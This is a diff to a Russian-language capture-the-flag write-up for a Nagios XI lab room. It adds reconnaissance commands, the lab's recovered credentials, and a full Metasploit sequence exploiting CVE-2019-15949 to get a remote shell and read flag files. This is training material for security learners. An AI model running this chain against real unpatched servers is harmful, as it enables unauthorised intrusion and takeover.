@@ -11,9 +11,18 @@
 ### Ответьте на вопросы ниже
 Какой скрытый файл вы нашли?
 ```commandline
+nmap -sSCV <IP>
+gobuster dir -u http://<ip>:80/ -w /path-to-wordlist -x txt,php,html
+curl -s http://<IP>
+python3 -c "print(''.join([chr(i) for i in [47, 80, 73, 51, 84, 46, 80, 78, 103]]))"
+```
+```commandline
 PI3T.Png
 ```
 Кто является создателем файла?
+```commandline
+exiftool PI3T.PNg
+```
 ```commandline
 Piet Mondrian
 ```
@@ -24,6 +33,9 @@ Piet Mondrian
 ```
 Какое имя пользователя вы нашли?
 ```commandline
+./npiet /data/tmp/files/PI3T.ppm
+```
+```commandline
 nagiosadmin
 ```
 Какой пароль вы нашли?
@@ -32,10 +44,26 @@ n3p3UQ&9BjLp4$7uhWdY
 ```
 Какой номер CVE для этой уязвимости? Он будет в формате: CVE-0000-0000
 ```commandline
+searchsploit ngios XI -w
+```
+```commandline
 CVE-2019-15949
 ```
 Теперь, когда мы нашли нашу уязвимость, давайте найдем наш эксплойт. Для этой части комнаты мы будем использовать 
 модуль Metasploit, связанный с этим эксплойтом. Давайте продолжим и запустим Metasploit с помощью команды `msfconsole`.
+```commandline
+msfconsole
+search ngios XI
+use 8
+show options
+set LHOST AttackerIP
+set RHOST MachineIP
+set PASSWORD PW
+run
+shell
+cat user.txt
+cat root.txt
+```
 ```commandline
 Ответ не нужен
 ```
